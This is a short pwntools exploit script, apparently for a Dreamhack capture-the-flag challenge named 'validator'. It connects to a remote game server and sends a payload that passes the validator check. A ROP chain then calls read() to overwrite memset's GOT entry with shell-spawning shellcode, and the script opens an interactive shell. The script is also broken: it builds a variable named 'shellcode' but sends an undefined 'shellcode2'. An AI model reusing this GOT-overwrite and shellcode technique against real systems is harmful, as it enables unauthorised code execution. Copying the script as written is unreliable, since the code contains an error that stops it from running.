from pwn import *
import time
import binascii

context.update(arch='amd64', os='linux')

#p = process("./validator_server")
p = remote("host1.dreamhack.games", 11294)
e = ELF("./validator_server")

payload = b"DREAMHACK!"
for i in range(118):
    char = (118-i).to_bytes(1, byteorder="little")
    payload += char
payload += p64(0)

#ROPgadget --binary validator_dist | grep rdi
pop_rdi = 0x4006f3
pop_rsi_pop_r15 = 0x4006f1
pop_rdx = 0x40057b
memset_got = e.got["memset"]
read_plt = e.plt["read"]
print(hex(memset_got))
print(hex(read_plt))
#read(0, buf, count)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_pop_r15)
payload += p64(memset_got)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0x50)
payload += p64(read_plt)

payload += p64(e.got["memset"])

shellcode = asm(shellcraft.amd64.linux.sh())
p.send(payload)
time.sleep(0.5)
p.send(shellcode2)
p.interactive()